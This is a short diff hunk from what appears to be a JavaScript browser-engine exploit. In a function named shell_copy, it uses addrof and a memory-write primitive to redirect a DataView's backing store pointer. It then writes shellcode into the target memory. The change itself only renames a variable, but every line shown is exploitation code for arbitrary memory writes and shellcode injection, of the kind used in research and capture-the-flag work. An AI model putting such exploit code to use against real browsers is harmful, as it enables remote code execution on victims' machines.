@@ -106,8 +106,8 @@ function shell_copy(addr, shellcode) {
 
     console.log("\033[31mbuff: 0x\033[0m"+ buf_addr.toString(16))
     console.log("\033[31mdebug dataview: 0x\033[0m"+ addrof(dataview).toString(16))
-    let store_addr = buf_addr + 0x20n;
-    wrivar(store_addr, addr);
+    let backing_store_addr = buf_addr + 0x20n;
+    wrivar(backing_store_addr, addr);
 
     for (let i = 0; i < shellcode.length; i++) {
 	dataview.setUint32(4*i, shellcode[i], true);
